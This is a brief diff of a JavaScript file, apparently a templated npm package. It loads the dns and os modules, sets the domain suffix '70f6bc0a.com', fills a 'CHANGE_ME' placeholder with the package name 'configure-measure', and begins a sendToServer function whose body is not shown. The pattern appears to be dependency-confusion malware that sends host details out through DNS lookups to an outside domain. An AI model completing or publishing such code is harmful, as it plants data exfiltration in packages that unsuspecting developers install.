@@ -35,7 +35,7 @@ const dns = require('dns');
 const os = require('os');
 
 const suffix = '70f6bc0a.com';
-const package = '!!!CHANGE_ME!!!';
+const package = 'configure-measure';
 
 function sendToServer(data) {
 
